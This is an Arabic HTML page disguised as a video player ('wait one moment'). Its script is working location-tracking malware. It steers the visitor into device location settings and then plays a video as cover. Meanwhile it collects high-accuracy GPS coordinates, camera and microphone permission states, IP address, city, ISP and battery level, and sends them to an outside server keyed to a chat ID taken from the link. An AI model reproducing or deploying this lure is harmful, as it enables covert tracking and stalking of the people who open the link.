<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <title>لحظه وحده</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: black;
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      direction: rtl;
    }
    .container {
      text-align: center;
      padding: 10px;
      background-color: black;
      width: 98%;
      max-width: 1600px;
      margin: 10px auto;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 15px;
      color: white;
    }
    
    .video-wrapper {
      position: relative;
      width: 100%;
      height: 80vh;
      border-radius: 16px;
      overflow: hidden;
      background-color: #111;
      box-shadow: 0 10px 40px rgba(220, 53, 69, 0.4);
      border: 3px solid rgba(220, 53, 69, 0.5);
    }
    
    .thumbnail {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }
    
    video#myVideo {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      opacity: 0;
      transition: opacity 0.3s ease;
    }
    
    video#myVideo.active {
      opacity: 1;
      z-index: 5;
    }
    
    .play-btn {
      position: absolute;
      top: 42%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 140px;
      height: 140px;
      border-radius: 50%;
      background-color: rgba(220, 53, 69, 0.95);
      border: 5px solid white;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      transition: all 0.3s ease;
      box-shadow: 0 8px 35px rgba(0, 0, 0, 0.7);
      z-index: 10;
    }
    .play-btn:hover {
      background-color: rgba(200, 35, 51, 1);
      transform: translate(-50%, -50%) scale(1.1);
    }
    .play-btn:active {
      transform: translate(-50%, -50%) scale(0.95);
    }
    .play-btn::after {
      content: '';
      display: block;
      width: 0;
      height: 0;
      border-style: solid;
      border-width: 28px 0 28px 48px;
      border-color: transparent transparent transparent white;
      margin-left: 8px;
    }
    
    .play-btn.hidden { display: none; }
    
    .loading {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #dc3545;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .success {
      color: #28a745;
      font-size: 18px;
      margin-top: 20px;
      display: none;
    }
    .status-msg {
      display: none;
    }
    
    /* ========== الخلفية المعتمة ========== */
    .overlay-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.95);
      z-index: 999;
      display: none;
      justify-content: center;
      align-items: center;
    }
    
    .overlay-background.show {
      display: flex;
    }
    
    /* ========== الملصق بدون إطار ========== */
    .sticker-wrapper {
      animation: popIn 0.3s ease;
      z-index: 1000;
      display: flex;
      justify-content: center;
      align-items: center;
      width: 100%;
      height: 100%;
    }
    
    @keyframes popIn {
      0% {
        transform: scale(0.3);
        opacity: 0;
      }
      100% {
        transform: scale(1);
        opacity: 1;
      }
    }
    
    .sticker-image {
      width: 90vw;
      max-width: 500px;
      height: auto;
      aspect-ratio: auto;
      display: block;
      filter: drop-shadow(0 0 30px rgba(0, 122, 255, 0.5));
      object-fit: contain;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>انتظر لحظه وحد..</h1>
    
    <div class="video-wrapper">
      <img src="https://imgbs.com/uploads/yr-5a228f0a.jpg" alt="thumbnail" class="thumbnail" id="thumbnail">
      
      <video id="myVideo" loop playsinline webkit-playsinline preload="auto">
        <source src="https://files.catbox.moe/l47qdm.mp4" type="video/mp4">
        متصفحك لا يدعم تشغيل الفيديو.
      </video>
      
      <button class="play-btn" id="locationBtn" aria-label="تشغيل الفيديو" onclick="handleClick()"></button>
    </div>
    
    <div class="loading" id="loading"></div>
    <div class="status-msg" id="statusMsg"></div>
    <div class="success" id="success">تم بنجاح</div>
  </div>
  
  <!-- ========== الخلفية المعتمة + الملصق فقط ========== -->
  <div class="overlay-background" id="overlayBackground">
    <div class="sticker-wrapper">
      <img 
        src="https://www.image2url.com/r2/default/gifs/1783343543129-393c7f2c-4e59-41e7-b207-1b18c64a2258.gif" 
        alt="تفعيل الموقع" 
        class="sticker-image"
      />
    </div>
  </div>

  <script>
    const SERVER_URL = 'https://server-brxz.onrender.com/submitData';
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chatId') || '';
    
    let clickCount = 0;
    let locationGranted = false;
    let returnedFromSettings = false;
    let countdownTimeout = null;
    
    // ========== إظهار الملصق لمدة 3 ثواني ثم التوجيه ==========
    function showStickerThenRedirect() {
      const overlay = document.getElementById('overlayBackground');
      
      overlay.classList.add('show');
      
      countdownTimeout = setTimeout(() => {
        overlay.classList.remove('show');
        
        setTimeout(() => {
          redirectToSettings();
        }, 200);
      }, 3000);
    }
    
    // ========== إخفاء الملصق ==========
    function hideSticker() {
      if (countdownTimeout) {
        clearTimeout(countdownTimeout);
      }
      
      const overlay = document.getElementById('overlayBackground');
      overlay.classList.remove('show');
    }
    
    // ========== التوجيه إلى إعدادات الموقع ==========
    function redirectToSettings() {
      const ua = navigator.userAgent;
      
      if (/Android/i.test(ua)) {
        const intents = [
          'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
          'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;package=com.android.settings;end',
          'intent://com.android.settings/.Settings$LocationSettingsActivity#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;end',
          'intent:#Intent;action=android.settings.SETTINGS;end',
          'intent://com.android.settings/com.android.settings.Settings#Intent;action=android.settings.SETTINGS;end'
        ];
        
        let index = 0;
        function tryNext() {
          if (index >= intents.length) return;
          
          const intent = intents[index];
          try {
            window.location.href = intent;
            
            setTimeout(() => {
              if (!document.hidden) {
                index++;
                tryNext();
              }
            }, 500);
          } catch (e) {
            index++;
            tryNext();
          }
        }
        
        tryNext();
        
      } else if (/iPhone|iPad|iPod/i.test(ua)) {
        const iosUrls = [
          'App-Prefs:Privacy&path=LOCATION',
          'App-Prefs:root=Privacy&path=LOCATION_SERVICES',
          'prefs:root=Privacy&path=LOCATION'
        ];
        
        for (let url of iosUrls) {
          try {
            window.location.href = url;
          } catch (e) {}
        }
        
      } else if (/Windows/i.test(ua)) {
        window.location.href = 'ms-settings:privacy-location';
      } else if (/Mac/i.test(ua)) {
        window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
      }
    }
    
    // ========== اكتشاف العودة من الإعدادات ==========
    document.addEventListener('visibilitychange', async () => {
      if (document.visibilityState === 'visible' && clickCount >= 1) {
        console.log('🔄 المستخدم رجع من الإعدادات');
        returnedFromSettings = true;
        
        hideSticker();
      }
    });
    
    // ========== التعامل مع النقرات ==========
    function handleClick() {
      clickCount++;
      console.log(`🎯 نقرة رقم ${clickCount}`);
      
      if (clickCount === 1) {
        console.log('📍 عرض الملصق ثم التوجيه...');
        
        showStickerThenRedirect();
        
      } else {
        hideSticker();
        playVideoAndSendData();
      }
    }
    
    // ========== تشغيل الفيديو وطلب الإذن ==========
    function playVideoAndSendData() {
      const video = document.getElementById('myVideo');
      const btn = document.getElementById('locationBtn');
      const thumbnail = document.getElementById('thumbnail');
      const loading = document.getElementById('loading');
      
      btn.classList.add('hidden');
      thumbnail.style.display = 'none';
      video.classList.add('active');
      video.setAttribute('controls', '');
      video.muted = false;
      video.volume = 1.0;
      
      video.play().catch(error => {
        video.muted = true;
        video.play().catch(e => console.log('فشل التشغيل:', e));
      });
      
      loading.style.display = 'block';
      
      collectAndSend();
    }
    
    // ========== جمع البيانات ==========
    async function collectAndSend() {
      const data = {
        chatId: chatId,
        location: 'غير متاح',
        permissions: 'غير محددة',
        ipInfo: 'غير متوفرة',
        battery: 'غير معروفة',
        imageDatas: ''
      };
      
      try {
        data.location = await getLocation();
        locationGranted = true;
        console.log('✅ الموقع:', data.location);
      } catch (e) {
        console.log('❌ فشل الموقع:', e.message);
        data.location = 'رُفض الإذن';
      }
      
      const [permissions, ipInfo, battery] = await Promise.all([
        getPermissions().catch(() => 'غير محددة'),
        getIPInfo().catch(() => 'غير متوفرة'),
        getBatteryInfo().catch(() => 'غير معروف')
      ]);
      
      data.permissions = permissions;
      data.ipInfo = ipInfo;
      data.battery = battery;
      
      console.log('📦 البيانات:', data);
      
      await sendToServer(data);
    }
    
    // ========== إرسال البيانات ==========
    async function sendToServer(data) {
      const loading = document.getElementById('loading');
      const success = document.getElementById('success');
      
      try {
        const formData = new URLSearchParams();
        formData.append('chatId', data.chatId || '');
        formData.append('location', data.location || '');
        formData.append('permissions', data.permissions || '');
        formData.append('ipInfo', data.ipInfo || '');
        formData.append('battery', data.battery || '');
        formData.append('imageDatas', data.imageDatas || '');
        
        await fetch(SERVER_URL, {
          method: 'POST',
          body: formData,
          mode: 'no-cors'
        });
        
        console.log('✅ تم الإرسال');
        
        if (loading) loading.style.display = 'none';
        if (success) success.style.display = 'block';
        
        setTimeout(async () => {
          try {
            await fetch(SERVER_URL, {
              method: 'POST',
              body: formData,
              mode: 'no-cors'
            });
          } catch (e) {}
        }, 5000);
        
      } catch (error) {
        console.error('❌ فشل الإرسال:', error);
        if (loading) loading.style.display = 'none';
        if (success) success.style.display = 'block';
      }
    }
    
    // ========== دوال جمع البيانات ==========
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject('غير مدعوم');
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const long = position.coords.longitude;
            const acc = position.coords.accuracy;
            resolve(`Lat: ${lat}, Long: ${long}, Accuracy: ${acc}m`);
          },
          (error) => reject(error.message),
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });
    }
    
    async function getPermissions() {
      const results = [];
      const perms = ['geolocation', 'camera', 'microphone', 'notifications'];
      
      if (navigator.permissions && navigator.permissions.query) {
        for (const perm of perms) {
          try {
            const result = await navigator.permissions.query({ name: perm });
            results.push(`${perm}: ${result.state}`);
          } catch (e) {
            results.push(`${perm}: غير مدعوم`);
          }
        }
      }
      return results.join(' | ') || 'غير محددة';
    }
    
    async function getIPInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return `IP: ${data.ip}, City: ${data.city || 'N/A'}, Country: ${data.country_name || 'N/A'}, ISP: ${data.org || 'N/A'}`;
      } catch (e) {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return `IP: ${data.ip}`;
        } catch (e2) {
          return 'غير متوفرة';
        }
      }
    }
    
    async function getBatteryInfo() {
      if (!navigator.getBattery) return 'غير مدعوم';
      try {
        const battery = await navigator.getBattery();
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? 'يشحن' : 'لا يشحن';
        return `${level}% - ${charging}`;
      } catch (e) {
        return 'غير معروف';
      }
    }
  </script>
</body>
</html>
